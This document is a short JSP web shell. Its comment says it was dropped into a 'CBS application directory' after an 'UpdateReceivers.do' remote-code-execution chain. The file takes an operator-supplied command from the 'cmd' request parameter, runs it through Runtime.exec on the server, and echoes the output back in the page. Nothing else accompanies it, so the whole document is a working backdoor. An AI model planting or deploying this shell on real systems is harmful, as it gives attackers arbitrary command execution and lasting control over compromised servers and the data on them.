<%@ page import="java.util.*,java.io.*"%>
<%
    // JSP web shell dropped into the CBS application directory after the
    // UpdateReceivers.do RCE chain. Reads an operator-supplied command from
    // the request and runs it through the servlet container's JVM.
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        DataInputStream in = new DataInputStream(p.getInputStream());
        String line;
        out.println("<pre>");
        while ((line = in.readLine()) != null) {
            out.println(line);
        }
        out.println("</pre>");
    }
%>
